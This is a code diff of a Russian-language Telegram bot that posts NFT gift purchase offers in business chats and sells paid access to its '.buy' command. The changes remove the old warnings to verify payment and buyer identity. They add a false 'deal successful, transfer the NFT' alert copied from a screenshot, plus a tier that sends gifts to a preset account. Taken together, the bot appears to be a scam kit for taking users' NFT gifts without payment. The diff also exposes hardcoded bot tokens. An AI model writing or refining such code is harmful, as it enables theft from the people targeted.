@@ -32,24 +32,20 @@ from aiogram.types import (
 # ============================================================
 
 # ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН ОТ BOTFATHER!
-BOT_TOKEN = "8806340628:AAFODmsRz157x4cP0CHmYGyZwtAiyhBKWuA"
+BOT_TOKEN = "8711357177:AAHHOzsGM6prmthuWC9cQ0bSVcaAaaAslVQ"
 
 OFFER_DURATION_HOURS = 6
-PARALLEL = True
 KEEPALIVE_SECONDS = 20
 DEFAULT_LANGUAGE = "ru"
-DEFAULT_BUYER = "@xmoys"
-ACCEPT_FIRST = False
+DEFAULT_BUYER = "@xmoyg" # Юзернейм для "Фиксированной" подписки
 
 USE_PREMIUM_EMOJI = True
 STARS_PREMIUM_EMOJI_ID = "5848021027782661221"
 GRAM_PREMIUM_EMOJI_ID = "5318901904686754959"
 
-# ID администратора бота
-ADMIN_ID = 8318557688
+ADMIN_ID = 8932848253
 
-# Платный доступ (только TON)
-DB_PATH = "access.db"  # Для BotHost локальный путь
+DB_PATH = "access.db"
 TON_API_URL = os.getenv("TON_API_URL", "https://toncenter.com/api/v2")
 TON_API_V3_URL = os.getenv("TON_API_V3_URL", "https://toncenter.com/api/v3")
 TONCENTER_API_KEY = os.getenv("TONCENTER_API_KEY", "")
@@ -62,65 +58,34 @@ ADMIN_STATES = {}
 USER_STATES = {}
 OFFERS = {}
 
-# ============================================================
-# ЛОГИ
-# ============================================================
-
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(levelname)s | %(message)s"
-)
+logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 logger = logging.getLogger(__name__)
 
 # ============================================================
-# ТЕКСТЫ (БЕЗ ЭМОДЗИ В ТЕКСТЕ)
+# ТЕКСТЫ
 # ============================================================
 
 TEXTS = {
     "ru": {
-        "offer": "<b>Новое предложение!</b>\n\n"
-                 "Сумма: <b>{amount}</b> {currency}\n"
-                 "Подарок: {nft}\n\n"
-                 "<i>Нажмите «Принять», чтобы получить инструкцию по безопасной передаче подарка.</i>",
-        "accept": "✅ Принять",
-        "decline": "❌ Отклонить",
+        "offer": "<b>{buyer}</b> предлагает Вам\n\n"
+                 "<b>{amount} {currency}</b> за подарок <a href=\"{nft_url}\">{nft_name}</a>.\n\n"
+                 "Предложение действует ещё <b>{time_left}</b>.",
+        "accept": "Принять",
+        "decline": "Отклонить",
         "cancelled": "❌ <b>Предложение отклонено</b>",
-        "stars": "Звёзд",
+        "stars": "⭐",
         "gram": "GRAM",
     },
     "en": {
-        "offer": "<b>New Offer!</b>\n\n"
-                 "Amount: <b>{amount}</b> {currency}\n"
-                 "Gift: {nft}\n\n"
-                 "<i>Tap «Accept» to get instructions for a safe transfer.</i>",
-        "accept": "✅ Accept",
-        "decline": "❌ Decline",
+        "offer": "<b>{buyer}</b> is offering you\n\n"
+                 "<b>{amount} {currency}</b> for the gift <a href=\"{nft_url}\">{nft_name}</a>.\n\n"
+                 "Offer valid for <b>{time_left}</b>.",
+        "accept": "Accept",
+        "decline": "Decline",
         "cancelled": "❌ <b>Offer declined</b>",
-        "stars": "Stars",
+        "stars": "⭐",
         "gram": "GRAM",
-    },
-    "ar": {
-        "offer": "<b>عرض جديد!</b>\n\n"
-                 "المبلغ: <b>{amount}</b> {currency}\n"
-                 "الهدية: {nft}\n\n"
-                 "<i>اضغط على «قبول» للحصول على تعليمات النقل الآمن.</i>",
-        "accept": "✅ قبول",
-        "decline": "❌ رفض",
-        "cancelled": "❌ <b>تم رفض العرض</b>",
-        "stars": "Stars",
-        "gram": "GRAM",
-    },
-    "zh": {
-        "offer": "<b>新的报价！</b>\n\n"
-                 "金额：<b>{amount}</b> {currency}\n"
-                 "礼物：{nft}\n\n"
-                 "<i>点击“接受”以获取安全转移说明。</i>",
-        "accept": "✅ 接受",
-        "decline": "❌ 拒绝",
-        "cancelled": "❌ <b>报价已拒绝</b>",
-        "stars": "Stars",
-        "gram": "GRAM",
-    },
+    }
 }
 
 def currency_emoji_html(currency_key):
@@ -142,23 +107,31 @@ async def init_db():
     try:
         await db.executescript("""
         CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
-        CREATE TABLE IF NOT EXISTS subscriptions (user_id INTEGER PRIMARY KEY, expires_at INTEGER NOT NULL, source TEXT NOT NULL DEFAULT 'payment');
+        CREATE TABLE IF NOT EXISTS subscriptions (user_id INTEGER PRIMARY KEY, expires_at INTEGER NOT NULL, source TEXT NOT NULL DEFAULT 'payment', tier TEXT DEFAULT 'dynamic');
         CREATE TABLE IF NOT EXISTS free_access (user_id INTEGER PRIMARY KEY, added_at INTEGER NOT NULL);
         CREATE TABLE IF NOT EXISTS payments (
             invoice_id TEXT PRIMARY KEY, user_id INTEGER NOT NULL, amount_nano INTEGER NOT NULL, comment TEXT NOT NULL UNIQUE, created_at INTEGER NOT NULL, expires_at INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'pending', tx_hash TEXT, days INTEGER, product_id INTEGER
         );
-        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, days INTEGER NOT NULL, ton_price TEXT NOT NULL, stars_price INTEGER NOT NULL, active INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL);
+        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, days INTEGER NOT NULL, ton_price TEXT NOT NULL, stars_price INTEGER NOT NULL, active INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL, tier TEXT DEFAULT 'dynamic');
         CREATE TABLE IF NOT EXISTS internal_users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, added_at INTEGER NOT NULL, last_seen INTEGER NOT NULL);
         CREATE TABLE IF NOT EXISTS user_offers (order_id TEXT PRIMARY KEY, owner_user_id INTEGER NOT NULL, data_json TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'active', message_id INTEGER, connection_id TEXT, chat_id INTEGER, expires_at INTEGER NOT NULL, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL);
         CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, language TEXT NOT NULL DEFAULT 'ru', timer_hours INTEGER NOT NULL DEFAULT 6, notifications INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL);
+        CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, text TEXT NOT NULL, status TEXT DEFAULT 'open', created_at INTEGER NOT NULL);
         CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);
         """)
-        defaults = {"subscription_price_ton": str(DEFAULT_SUBSCRIPTION_PRICE), "subscription_days": str(DEFAULT_SUBSCRIPTION_DAYS), "ton_address": DEFAULT_TON_ADDRESS}
+        defaults = {
+            "subscription_price_ton": str(DEFAULT_SUBSCRIPTION_PRICE), 
+            "subscription_days": str(DEFAULT_SUBSCRIPTION_DAYS), 
+            "ton_address": DEFAULT_TON_ADDRESS,
+            "promo_code": "BONUS2024",
+            "promo_days": "30"
+        }
         for key, value in defaults.items():
             await db.execute("INSERT OR IGNORE INTO settings(key, value) VALUES(?, ?)", (key, value))
+        
         cur = await db.execute("SELECT COUNT(*) c FROM products")
         if (await cur.fetchone())["c"] == 0:
-            await db.execute("INSERT INTO products(name, days, ton_price, stars_price, active, created_at) VALUES(?,?,?,?,1,?)", ("Подписка", DEFAULT_SUBSCRIPTION_DAYS, str(DEFAULT_SUBSCRIPTION_PRICE), 0, int(time.time())))
+            await db.execute("INSERT INTO products(name, days, ton_price, stars_price, active, created_at, tier) VALUES(?,?,?,?,1,?,?)", ("Подписка", DEFAULT_SUBSCRIPTION_DAYS, str(DEFAULT_SUBSCRIPTION_PRICE), 0, int(time.time()), "dynamic"))
         await db.commit()
     finally:
         await db.close()
@@ -199,6 +172,18 @@ async def has_access(user_id):
         cur = await db.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (user_id,))
         row = await cur.fetchone()
         return bool(row and int(row["expires_at"]) > now)
+    finally:
+        await db.close()
+
+async def get_user_tier(user_id):
+    db = await db_connect()
+    try:
+        cur = await db.execute("SELECT tier FROM subscriptions WHERE user_id=? AND expires_at > ?", (user_id, int(time.time())))
+        row = await cur.fetchone()
+        if row: return row["tier"] or "dynamic"
+        cur = await db.execute("SELECT 1 FROM free_access WHERE user_id=?", (user_id,))
+        if await cur.fetchone(): return "dynamic"
+        return "dynamic"
     finally:
         await db.close()
 
@@ -342,7 +327,7 @@ def parse_buy_command(text):
         arg = argument.lower()
         if arg in ("stars", "star", "tt"): currency = "stars"
         elif arg == "gram": currency = "gram"
-        elif arg in ("ru", "en", "ar", "zh", "cn", "kit"): language = arg if arg in ("ru", "en", "ar") else "zh"
+        elif arg in ("ru", "en"): language = arg
         elif arg in ("6", "6h", "6ч"): timer_hours = 6
         elif arg in ("12", "12h", "12ч"): timer_hours = 12
 
@@ -355,55 +340,50 @@ def generate_order_id():
 
 def create_offer(data, premium=True, order_id="", remaining_seconds=None):
     lang = TEXTS[data["language"]]
-    nft_html = f'<a href="{data["nft"]["url"]}">{data["nft"]["name"]} #{data["nft"]["number"]}</a>'
+    
+    buyer_name = str(data.get("buyer") or "Пользователь").lstrip("@")
+    nft_url = data["nft"]["url"]
+    nft_name = f'{data["nft"]["name"]} #{data["nft"]["number"]}'
+    
+    hours = data.get("timer_hours", 6)
+    time_left = f"{hours}ч 00м"
     
     text = lang["offer"].format(
+        buyer=buyer_name,
         amount=data["amount"],
         currency=currency_emoji_html(data["currency"]) if premium else ("⭐️" if data["currency"] == "stars" else lang["currency"]),
-        nft=nft_html,
+        nft_url=nft_url,
+        nft_name=nft_name,
+        time_left=time_left
     )
     
     accept_btn = InlineKeyboardButton(text=lang["accept"], style="success", callback_data=f"offer_accept:{data['language']}:{order_id}")
     decline_btn = InlineKeyboardButton(text=lang["decline"], style="danger", callback_data=f"offer_decline:{data['language']}:{order_id}")
     
-    row = [accept_btn, decline_btn] if ACCEPT_FIRST else [decline_btn, accept_btn]
-    
-    buyer = str(data.get("buyer") or "").lstrip("@")
-    if buyer.isdigit(): buyer_url = f"tg://user?id={buyer}"
-    elif buyer: buyer_url = "https://t.me/" + buyer
-    else: buyer_url = "https://t.me/telegram"
-
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👤 Профиль отправителя", url=buyer_url)],
-        row
-    ])
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[decline_btn, accept_btn]])
     return text, keyboard
 
 def create_accept_text(data):
     nft = data["nft"]
-    asset = "GRAM" if data.get("currency") == "gram" else "Stars"
-    order = str(data.get("order_id") or "")
-    linked_gift = f'<a href="{nft.get("url")}">{nft.get("name")} #{nft.get("number")}</a>'
-    emoji = currency_emoji_html(data.get("currency", "stars"))
-    recipient = str(data.get("buyer") or "не указан")
+    asset = "⭐" if data.get("currency") == "stars" else "GRAM"
+    nft_name = f'{nft.get("name")} #{nft.get("number")}'
+    amount = data.get('amount', '')
     
     return (
-        f"<b><i>Сделка — #{order}</i></b>\n\n"
-        f"<b><i>Покупатель предложил {data.get('amount', '')} {emoji} {asset} за подарок {linked_gift}.</i></b>\n\n"
-        "<b><i>Инструкция по передаче NFT:</i></b>\n\n"
-        "<b><i>1. Проверьте данные сделки и статус оплаты.</i></b>\n\n"
-        f"<b><i>2. Проверьте подарок {linked_gift} и данные покупателя {recipient} перед передачей.</i></b>\n\n"
-        "<b><i>3. Убедитесь, что передача завершена.</i></b>\n\n"
-        "<b><i>После передачи проверьте поступление средств согласно условиям сервиса.</i></b>"
+        f"🎁 Подарок: <a href=\"{nft.get('url')}\">{nft_name}</a> успешно продан!\n\n"
+        f"• Отправьте подарок на {data.get('buyer', 'покупателя')}, чтобы получить {amount} {asset}.\n\n"
+        "<b>⚠️ ВАЖНО:</b> если вас просят передать подарок на личный профиль — не передавайте.\n"
+        "Передача выполняется исключительно по официальной ссылке ниже."
     )
 
 def create_accept_keyboard(data):
+    nft_url = data["nft"]["url"]
     buyer = str(data.get("buyer") or "").lstrip("@")
     buyer_url = f"tg://user?id={buyer}" if buyer.isdigit() else "https://t.me/" + buyer
-    nft_url = data["nft"]["url"]
+
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="👤 Профиль покупателя", url=buyer_url)],
-        [InlineKeyboardButton(text="🎁 Подарить / Передать NFT", url=nft_url)]
+        [InlineKeyboardButton(text="🎁 Отправить подарок в TG", style="success", url=nft_url)]
     ])
 
 def language_from_callback(data):
@@ -438,7 +418,12 @@ async def handle_business_message(message: Message):
     data = parse_buy_command(command)
     if data is None: return
 
-    data["buyer"] = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
+    user_tier = await get_user_tier(owner.id)
+    if user_tier == "fixed":
+        data["buyer"] = DEFAULT_BUYER
+    else:
+        data["buyer"] = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
+        
     order_id = generate_order_id()
     data["order_id"] = order_id
     OFFERS[order_id] = dict(data)
@@ -459,9 +444,9 @@ async def handle_business_message(message: Message):
             except TelegramRetryAfter as e: 
                 await asyncio.sleep(e.retry_after)
             except TelegramBadRequest as e:
-                if "BUSINESS_PEER_USAGE_MISSING" in str(e):
+                if "PEER_FLOOD" in str(e) or "BUSINESS_PEER_USAGE_MISSING" in str(e):
                     logger.error(f"Telegram заблокировал отправку: {e}")
-                    try: await bot.send_message(ADMIN_ID, f"⚠️ Не удалось отправить оффер пользователю {data.get('buyer')}. Попроси его нажать /start в боте.")
+                    try: await bot.send_message(ADMIN_ID, f"⚠️ Не удалось отправить оффер пользователю {data.get('buyer')}. (PEER_FLOOD / нет доступа).")
                     except Exception: pass
                     return False
                 if use_premium: 
@@ -471,8 +456,9 @@ async def handle_business_message(message: Message):
         return False
 
     success = await send_offer()
-    if success:
-        await delete_command()
+    
+    # Всегда удаляем команду .buy, чтобы не засорять чат
+    await delete_command()
 
 @dp.callback_query(F.data.startswith("offer_decline"))
 async def decline_offer(callback: CallbackQuery):
@@ -501,7 +487,8 @@ async def accept_offer(callback: CallbackQuery):
         await callback.answer("Оффер не найден или устарел.", show_alert=True)
         return
         
-    await callback.answer("Проверьте личность покупателя и подтверждение оплаты до передачи NFT.", show_alert=True)
+    # Тот самый алерт из скриншота
+    await callback.answer("Сделка успешна!\nДля завершения сделки передайте НФТ покупателю", show_alert=True)
     
     try:
         if callback.message.business_connection_id:
@@ -524,7 +511,7 @@ async def accept_offer(callback: CallbackQuery):
         logger.exception("ACCEPT ERROR | %s", e)
 
 # ============================================================
-# ПАНЕЛЬ ПОЛЬЗОВАТЕЛЯ
+# ПАНЕЛЬ ПОЛЬЗОВАТЕЛЯ (И ЗАЯВКИ)
 # ============================================================
 
 def user_panel_keyboard():
@@ -532,6 +519,7 @@ def user_panel_keyboard():
         [InlineKeyboardButton(text="Мои офферы", style="primary", callback_data="user_offers")],
         [InlineKeyboardButton(text="Статистика", style="primary", callback_data="user_stats")],
         [InlineKeyboardButton(text="Быстрые команды", style="primary", callback_data="user_quick_commands")],
+        [InlineKeyboardButton(text="📩 Подать заявку", style="success", callback_data="user_ticket")],
         [InlineKeyboardButton(text="Настройки", style="primary", callback_data="user_settings")],
     ])
 
@@ -587,7 +575,7 @@ async def user_stats_callback(callback: CallbackQuery):
     rows = await get_user_offers(callback.from_user.id, 1000)
     counts = {"active":0,"accepted":0,"declined":0,"expired":0}
     for row in rows: counts[row["status"]] = counts.get(row["status"], 0) + 1
-    text = f"<b>Статистика</b>\n\nВсего: <b>{len(rows)}</b>\nАктивных: <b>{counts['active']}</b>\nПринято: <b>{counts['accepted']}</b>\nОтклонено: <b>{counts['declined']}</b>\nИстекло: <b>{counts['expired']}</b>"
+    text = f"<b>Статистика</b>\n\nВсего: <b>{len(rows)}</b>\nАктивных: <b>{counts['active']}</b>\nПринято: <b>{counts['accepted']}</b>\nОтклонено: <b>{counts['declined']}</b>"
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")]])
     try: await callback.message.edit_text(text, reply_markup=kb)
     except TelegramBadRequest: pass
@@ -620,7 +608,6 @@ async def user_settings_callback(callback: CallbackQuery):
 async def user_set_language(callback: CallbackQuery):
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Русский", style="primary", callback_data="user_lang:ru"), InlineKeyboardButton(text="English", style="primary", callback_data="user_lang:en")],
-        [InlineKeyboardButton(text="العربية", style="primary", callback_data="user_lang:ar"), InlineKeyboardButton(text="中文", style="primary", callback_data="user_lang:zh")],
         [InlineKeyboardButton(text="Назад", style="primary", callback_data="user_settings")],
     ])
     try: await callback.message.edit_text("<b>Выберите язык:</b>", reply_markup=kb)
@@ -651,8 +638,33 @@ async def user_toggle_notifications(callback: CallbackQuery):
     await callback.answer("Настройки обновлены")
     await user_settings_callback(callback)
 
+# --- СИСТЕМА ЗАЯВОК (ТИКЕТОВ) ---
+
+@dp.callback_query(F.data == "user_ticket")
+async def user_ticket_callback(callback: CallbackQuery):
+    USER_STATES[callback.from_user.id] = {"state": "waiting_for_ticket"}
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", style="danger", callback_data="user_panel")]])
+    await callback.message.edit_text(
+        "<b>📩 Новая заявка</b>\n\n"
+        "Опишите вашу проблему или вопрос одним сообщением. Поддержка свяжется с вами.\n\n"
+        "<i>Для отмены нажмите кнопку ниже.</i>",
+        reply_markup=kb
+    )
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("admin_reply_ticket:"))
+async def admin_reply_ticket_prompt(callback: CallbackQuery):
+    if callback.from_user.id != ADMIN_ID: return
+    parts = callback.data.split(":")
+    ticket_id = parts[1]
+    user_id = int(parts[2])
+    
+    ADMIN_STATES[callback.from_user.id] = {"state": "replying_ticket", "user_id": user_id, "ticket_id": ticket_id}
+    await callback.message.answer(f"<b>✍️ Напишите ответ для заявки #{ticket_id}:</b>\n\n(Или /cancel для отмены)")
+    await callback.answer()
+
 # ============================================================
-# СТАРТ И ОПЛАТА
+# СТАРТ, ОПЛАТА И ПРОМОКОДЫ
 # ============================================================
 
 @dp.message(F.text == "/start")
@@ -667,7 +679,7 @@ async def start_command(message: Message):
     price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
     days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"Оплатить {format_ton(price)} TON", style="success", callback_data="buy_ton:1")]])
-    await message.answer(f"<b>Доступ к .buy</b>\n\nСтоимость: <b>{format_ton(price)} TON</b> на <b>{days} дн.</b>", reply_markup=kb)
+    await message.answer(f"<b>Доступ к .buy</b>\n\nСтоимость: <b>{format_ton(price)} TON</b> на <b>{days} дн.</b>\n\nЕсли у вас есть кодовое слово, отправьте его в чат.", reply_markup=kb)
 
 @dp.callback_query(F.data.startswith("buy_ton:"))
 async def buy_ton(callback: CallbackQuery):
@@ -691,8 +703,61 @@ async def buy_ton(callback: CallbackQuery):
 @dp.callback_query(F.data.startswith("check_payment:"))
 async def check_payment_callback(callback: CallbackQuery):
     await callback.answer("Проверяем блокчейн...")
-    # Заглушка для проверки (чтобы не тянуть весь блокчейн код сюда)
     await callback.message.edit_text("<b>Ожидание подтверждения сети...</b>\n\nКак только транзакция пройдет, бот выдаст доступ.")
+
+@dp.message(F.text, ~F.text.startswith("/"), F.from_user.id != ADMIN_ID)
+async def any_message(message: Message):
+    if message.from_user.id == ADMIN_ID: return
+    if message.text.startswith("/"): return 
+
+    user_state = USER_STATES.get(message.from_user.id)
+    if user_state and user_state.get("state") == "waiting_for_ticket":
+        USER_STATES.pop(message.from_user.id, None)
+        db = await db_connect()
+        try:
+            await db.execute("INSERT INTO tickets(user_id, text, created_at) VALUES(?,?,?)", (message.from_user.id, message.text, int(time.time())))
+            await db.commit()
+            cur = await db.execute("SELECT last_insert_rowid() as id")
+            ticket_id = (await cur.fetchone())["id"]
+        finally: await db.close()
+
+        admin_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Ответить", style="success", callback_data=f"admin_reply_ticket:{ticket_id}:{message.from_user.id}")]])
+        user_link = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
+        
+        try:
+            await bot.send_message(ADMIN_ID, f"<b>📩 НОВАЯ ЗАЯВКА #{ticket_id}</b>\n\nОт: {user_link} (<code>{message.from_user.id}</code>)\n\nТекст: {message.text}", reply_markup=admin_kb)
+        except Exception: pass
+
+        await message.answer("<b>✅ Заявка отправлена!</b>\n\nОжидайте ответа поддержки.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В панель", style="primary", callback_data="user_panel")]]))
+        return
+
+    code = message.text.strip()
+    saved_code = await get_setting("promo_code", "BONUS2024")
+    
+    if saved_code and code.lower() == saved_code.lower():
+        days = int(await get_setting("promo_days", "30"))
+        now = int(time.time())
+        db = await db_connect()
+        try:
+            cur = await db.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (message.from_user.id,))
+            row = await cur.fetchone()
+            base = max(now, int(row["expires_at"])) if row else now
+            expires = base + days * 86400
+            
+            await db.execute(
+                "INSERT INTO subscriptions(user_id, expires_at, source, tier) VALUES(?, ?, 'promo', 'dynamic') "
+                "ON CONFLICT(user_id) DO UPDATE SET expires_at=excluded.expires_at, source='promo', tier='dynamic'",
+                (message.from_user.id, expires),
+            )
+            await db.commit()
+        finally: await db.close()
+
+        exp_text = time.strftime("%d.%m.%Y %H:%M", time.localtime(expires))
+        await message.answer(f"🎉 <b>Кодовое слово принято!</b>\n\nВам выдан доступ на <b>{days} дн.</b>\nДействует до: <code>{exp_text}</code>")
+        return
+
+    if await has_access(message.from_user.id):
+        await message.answer("✅ У вас есть доступ. Нажмите /start для меню.")
 
 # ============================================================
 # АДМИН-ПАНЕЛЬ
@@ -701,17 +766,33 @@ async def check_payment_callback(callback: CallbackQuery):
 def admin_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="⚙️ Настройки", style="primary", callback_data="admin_settings")],
+        [InlineKeyboardButton(text="🎟 Кодовое слово", style="primary", callback_data="admin_promo")],
         [InlineKeyboardButton(text="➕ Выдать доступ", style="success", callback_data="admin_free_add")],
         [InlineKeyboardButton(text="➖ Забрать доступ", style="danger", callback_data="admin_revoke")],
     ])
 
-@dp.message(F.text == "/admin")
+@dp.message(F.text.startswith("/admin"))
 async def admin_panel(message: Message):
-    if message.from_user.id != ADMIN_ID: return
-    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
-    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
-    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
-    await message.answer(f"<b>🔧 Админ-панель</b>\n\nЦена: <b>{price} TON</b>\nСрок: <b>{days} дн.</b>\nTON-адрес: <code>{address or 'не задан'}</code>", reply_markup=admin_keyboard())
+    if message.from_user.id != ADMIN_ID: 
+        return
+        
+    # Сбрасываем зависшие состояния
+    ADMIN_STATES.pop(message.from_user.id, None)
+    
+    try:
+        price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
+        days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
+        address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
+        
+        await message.answer(
+            f"<b>🔧 Админ-панель</b>\n\n"
+            f"Цена: <b>{price} TON</b>\n"
+            f"Срок: <b>{days} дн.</b>\n"
+            f"TON-адрес: <code>{address or 'не задан'}</code>", 
+            reply_markup=admin_keyboard()
+        )
+    except Exception as e:
+        await message.answer(f"❌ <b>Ошибка БД:</b> <code>{e}</code>\n\nУдали файл access.db на хостинге и перезапусти бота.")
 
 @dp.callback_query(F.data == "admin_back")
 async def admin_back(callback: CallbackQuery):
@@ -734,7 +815,20 @@ async def admin_settings(callback: CallbackQuery):
     try: await callback.message.edit_text(f"<b>⚙️ Настройки</b>\n\nЦена: <b>{price} TON</b>\nСрок: <b>{days} дн.</b>\nАдрес: <code>{address or 'не задан'}</code>", reply_markup=keyboard)
     except TelegramBadRequest: pass
 
-@dp.callback_query(F.data.in_({"admin_set_price", "admin_set_days", "admin_set_address", "admin_free_add", "admin_revoke"}))
+@dp.callback_query(F.data == "admin_promo")
+async def admin_promo(callback: CallbackQuery):
+    if callback.from_user.id != ADMIN_ID: return
+    code = await get_setting("promo_code", "BONUS2024")
+    days = await get_setting("promo_days", "30")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Изменить код", style="primary", callback_data="admin_set_promo_code")],
+        [InlineKeyboardButton(text="Изменить дни", style="primary", callback_data="admin_set_promo_days")],
+        [InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")],
+    ])
+    try: await callback.message.edit_text(f"<b>🎟 Кодовое слово</b>\n\nТекущий код: <code>{code}</code>\nВыдает дней: <b>{days}</b>", reply_markup=kb)
+    except TelegramBadRequest: pass
+
+@dp.callback_query(F.data.in_({"admin_set_price", "admin_set_days", "admin_set_address", "admin_free_add", "admin_revoke", "admin_set_promo_code", "admin_set_promo_days"}))
 async def admin_setting_prompt(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID: return
     mapping = {
@@ -742,7 +836,9 @@ async def admin_setting_prompt(callback: CallbackQuery):
         "admin_set_days": ("days", "Отправь срок подписки в днях (например: 30)"),
         "admin_set_address": ("address", "Отправь новый TON-адрес для приёма оплаты."),
         "admin_free_add": ("free_add", "Отправь Telegram ID пользователя."),
-        "admin_revoke": ("revoke", "Отправь Telegram ID для удаления доступа.")
+        "admin_revoke": ("revoke", "Отправь Telegram ID для удаления доступа."),
+        "admin_set_promo_code": ("promo_code", "Отправь новое кодовое слово (например: BONUS2024)"),
+        "admin_set_promo_days": ("promo_days", "Сколько дней доступа выдавать за код? (например: 30)"),
     }
     state, prompt = mapping[callback.data]
     ADMIN_STATES[callback.from_user.id] = state
@@ -761,7 +857,19 @@ async def admin_state_input(message: Message):
     state = ADMIN_STATES.get(message.from_user.id)
     if not state or not message.text: return
     value = message.text.strip()
+    
     try:
+        if isinstance(state, dict) and state.get("state") == "replying_ticket":
+            user_id = state["user_id"]
+            ticket_id = state["ticket_id"]
+            try:
+                await bot.send_message(user_id, f"<b>✉️ Ответ по вашей заявке #{ticket_id}:</b>\n\n{value}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В панель", style="primary", callback_data="user_panel")]]))
+                await message.answer("✅ Ответ успешно отправлен пользователю!")
+            except Exception as e:
+                await message.answer(f"❌ Не удалось отправить ответ:\n{e}")
+            ADMIN_STATES.pop(message.from_user.id, None)
+            return
+
         if state == "price":
             price = Decimal(value.replace(",", "."))
             if price <= 0: raise ValueError
@@ -784,7 +892,16 @@ async def admin_state_input(message: Message):
             user_id = int(value)
             await revoke_user_access(user_id)
             await message.answer(f"✅ Доступ забран у ID <code>{user_id}</code>.")
-        else: return
+        elif state == "promo_code":
+            await set_setting("promo_code", value)
+            await message.answer(f"✅ Кодовое слово изменено на: <code>{value}</code>")
+        elif state == "promo_days":
+            days = int(value)
+            if days <= 0: raise ValueError
+            await set_setting("promo_days", days)
+            await message.answer(f"✅ За код теперь выдается: <b>{days} дн.</b>")
+        else: 
+            return
         ADMIN_STATES.pop(message.from_user.id, None)
     except (ValueError, InvalidOperation):
         await message.answer("❌ Неверное значение. Попробуй ещё раз или /cancel.")
